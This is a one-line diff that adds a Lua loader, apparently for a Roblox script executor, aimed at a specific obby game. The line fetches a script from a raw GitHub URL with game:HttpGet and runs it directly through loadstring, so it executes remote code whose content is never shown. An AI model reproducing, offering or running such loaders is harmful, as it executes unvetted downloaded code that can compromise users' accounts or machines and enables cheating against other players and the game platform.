@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/1-2-player-grapple-cart-obby-spam1-mbc3twycjnmhk1.lua"))()
